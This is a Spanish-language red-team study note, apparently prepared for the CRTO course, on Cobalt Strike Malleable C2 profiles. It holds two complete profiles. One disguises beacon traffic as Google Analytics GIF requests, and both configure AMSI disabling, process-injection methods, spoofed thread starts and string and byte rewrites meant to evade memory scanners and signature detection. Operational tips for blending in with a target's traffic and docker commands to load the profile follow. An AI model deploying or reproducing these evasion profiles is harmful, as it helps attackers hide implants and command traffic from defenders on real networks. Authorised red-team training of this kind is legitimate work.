---
tags: [c2, cobalt-strike, malleable, profile, opsec]
status: wip
---

# Malleable C2 Profile

> Configuración del perfil que define cómo se comporta y parece el tráfico del beacon.

---

## Estructura del Perfil

```
# malleable.profile

# Configuración global
set sleeptime "60000";          # Callback cada 60s
set jitter "20";                # ±20% variación
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...";

# Bloque HTTP-GET (beacon → team server)
http-get {
    set uri "/api/v1/health";
    client {
        header "Accept" "application/json";
        # Datos del beacon en cookie o parámetro
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            print;
        }
    }
}

# Bloque HTTP-POST (team server → beacon, comandos)
http-post {
    set uri "/api/v1/update";
    client {
        header "Content-Type" "application/json";
        id { ... }
        output { ... }
    }
    server {
        header "Content-Type" "application/json";
        output { ... }
    }
}

# Configuración del beacon en memoria
stage {
    set userwx "false";
    set startrwx "false";
    set stomppe "true";
    set obfuscate "true";
    set sleep_mask "true";
    set module_x64 "xpsservices.dll";
    
    transform-x64 {
        strrep "ReflectiveLoader" "";
    }
}

# Configuración post-explotación
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
}

# Named pipe para SMB beacons
set pipename "wkssvc";
```

---

## Validar Perfil

```bash
# Antes de cargar en CS, validar el perfil
./c2lint malleable.profile
```

---

## Perfiles de Referencia

- [Malleable-C2-Profiles en GitHub](https://github.com/BC-SECURITY/Malleable-C2-Profiles)
- [CS Manual — Malleable C2](https://www.cobaltstrike.com/help-malleable-c2)

---

## OPSEC Tips

> - El `useragent` debe coincidir con agentes reales del entorno (capturar tráfico primero)
> - Los URIs deben parecer tráfico legítimo de la industria del cliente
> - El `stage` block es donde más diferencia hace en evasión de memory scanners
> - `sleep_mask "true"` + `module_x64` son las dos opciones más impactantes


## CRTO Steps

1. Modificamos el default profile

```
# make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker

set sleeptime "5000";

http-get {
        set uri "/__utm.gif";
        client {
                parameter "utmac" "UA-2202604-2";
                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";

                metadata {
                        netbios;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }

        server {
                header "Content-Type" "image/gif";

                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b

                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

                        print;
                }
        }
}

http-post {
        set uri "/___utm.gif";
        client {
                header "Content-Type" "application/octet-stream";

                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }

                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";

                output {
                        print;
                }
        }

        server {
                header "Content-Type" "image/gif";

                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

# dress up the staging process too
http-stager {
        server {
                header "Content-Type" "image/gif";
        }
}

stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}
process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

2. Reiniciamos el servidor, si no da error es que el perfil funciona.

```
sudo /usr/bin/docker restart cobalt
```

3. Podemos comprobar los logs de cobalt para ver si algo ha fallado o no 

```
sudo /usr/bin/docker logs cobalt
```

4. Cobalt > Malleable C2 Profile (revisamos que esté todo bien)

